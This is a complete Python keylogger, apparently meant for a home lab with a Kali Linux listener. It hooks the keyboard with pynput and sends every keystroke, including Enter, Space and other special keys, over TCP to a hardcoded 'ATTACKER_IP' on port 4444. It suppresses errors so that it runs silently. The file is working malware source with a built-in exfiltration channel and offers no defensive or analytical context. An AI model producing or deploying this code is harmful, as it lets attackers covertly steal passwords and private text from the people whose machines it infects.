import socket
from pynput.keyboard import Key, Listener

# --- CONFIGURATION ---
# This is the manual IP you assigned to Kali Linux
ATTACKER_IP = "192.168.1.50" 
PORT = 4444

def send_to_attacker(data):
    try:
        # Create a network socket (TCP)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to your Kali Linux listener
        s.connect((ATTACKER_IP, PORT))
        s.send(data.encode('utf-8'))
        s.close()
    except Exception:
        # If Linux isn't listening, the script stays silent
        pass

def on_press(key):
    try:
        # Send alphanumeric characters (a, b, c, 1, 2, 3)
        send_to_attacker(f"{key.char}")
    except AttributeError:
        # Send special keys (Space, Enter, etc.)
        if key == Key.space:
            send_to_attacker(" ")
        elif key == Key.enter:
            send_to_attacker("\n")
        else:
            send_to_attacker(f" [{key}] ")

# Start the 'Listener' process
with Listener(on_press=on_press) as listener:
    listener.join()